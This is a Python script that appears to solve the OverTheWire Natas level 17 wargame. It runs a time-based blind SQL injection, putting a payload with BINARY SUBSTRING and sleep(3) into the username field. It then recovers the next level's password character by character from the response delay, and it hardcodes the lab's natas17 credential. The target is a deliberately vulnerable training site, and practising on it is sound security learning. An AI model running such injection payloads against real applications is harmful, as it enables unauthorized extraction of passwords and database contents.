import requests, time


user = "natas17"
password ="8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw"
chars = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
guess = ""


for i in range(32,64):
    for char in chars:
        search = """natas18" AND BINARY SUBSTRING(PASSWORD, {0}, 1) = "{1}" AND sleep(3) AND ""=" """.format(i, char)
        payload = {'username': search}
        
        pre_time = time.time()

        req = requests.post('http://natas17.natas.labs.overthewire.org/index.php?debug=true',
            auth = (user, password),
            data = payload,
            )
        post_time = time.time()
        
        # print(req.content)

        if (post_time - pre_time) > 3:
            guess += char
            print("Guess is currently: {}".format(guess))



